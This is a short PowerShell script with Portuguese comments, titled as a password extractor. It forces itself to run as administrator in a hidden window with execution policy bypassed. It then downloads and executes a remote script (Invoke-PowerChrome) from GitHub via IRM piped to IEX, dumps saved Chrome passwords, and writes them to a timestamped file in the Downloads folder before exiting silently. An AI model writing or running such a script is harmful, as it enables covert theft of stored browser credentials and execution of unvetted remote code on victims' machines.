# ExtrairSenhas.ps1 - Salva em DOWNLOADS (em vez de Documents)

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Downloads (funciona em qualquer idioma do Windows)
$pastaDownloads = [Environment]::GetFolderPath("UserDownloads")
if (-not (Test-Path $pastaDownloads)) {
    $pastaDownloads = Join-Path $env:USERPROFILE "Downloads"
    if (-not (Test-Path $pastaDownloads)) {
        $pastaDownloads = Join-Path $env:USERPROFILE "Baixados"  # PT-BR alternativo
    }
}

# Nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDownloads "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa e redireciona a saída para o arquivo
Invoke-PowerChrome -Browser Chrome *> $arquivoSaida

# Sai silenciosamente
exit
